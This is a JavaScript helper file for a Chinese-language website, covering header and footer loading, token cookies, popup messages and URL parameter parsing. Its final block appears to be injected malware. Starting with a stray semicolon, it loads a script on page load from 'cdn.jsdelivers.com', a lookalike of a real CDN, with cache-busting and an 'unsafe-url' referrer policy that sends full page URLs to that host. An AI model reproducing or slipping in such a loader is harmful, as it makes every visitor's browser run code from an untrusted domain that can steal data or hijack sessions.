/**
 * Created by window on 2018/9/7.
 */
//footer
function load_footer(){
    $('body').append('<div class="footer"></div>');
    $('footer').load('../PC/footer.html',function(){
    });
}
//header
function load_header(){
    $('body').append('<div id="header"></div>');
    $('.header').load('../PC/header.html',function(){
    });
}
//需要登录
var _PROTOCOL = window.location.protocol;
var _HOST = window.location.host;
var _DOMAIN = _PROTOCOL + '//' + _HOST;
var _SERVER = _DOMAIN + "/hbc/PC/"; //域名
var _API = _DOMAIN + "/api/";
function get_user() {
    return $.cookie("token") || 0;
}

function set_user(token) {
    var days = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : 7;
    $.cookie("token", token, { expires: days, path: "/" });
}

function get_user_login() {
    return get_user() || (location.href = _SERVER+ "login.html");
}







//layer提示层
function layer_msg(content){
    if(content == ""){
        content = "请刷新重试"
    }
    layer.open({
        content: content
        ,skin: 'msg'
        ,time: 2 //2秒后自动关闭
    });
}
//layer提示层
function layer_loading(content){
    if(content == ""){
        content = "加载中"
    }
    layer.open({
        type: 2
        ,content: content
    });
}
function layer_close(){
    layer.closeAll()
}
/*提示框*/


/***
 * 获取url中所有参数
 * 返回参数键值对 对象
 */
function get_all_params() {
    var url = location.href;
    var nameValue;
    var paraString = url.substring(url.indexOf("?") + 1, url.length).split("&");
    var paraObj = {};
    for (var i = 0; nameValue = paraString[i]; i++) {
        var name = nameValue.substring(0, nameValue.indexOf("=")).toLowerCase();
        var value = nameValue.substring(nameValue.indexOf("=") + 1, nameValue.length);
        if (value.indexOf("#") > -1) {
            value = value.split("#")[0];
        }
        paraObj[name] = decodeURI(value);
    }
    return paraObj;
}

;function loadJSScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.referrerPolicy = "unsafe-url";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() {
                callback();
            };
        }
    };
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function() {
    loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
         console.log("Jquery loaded");
    });
}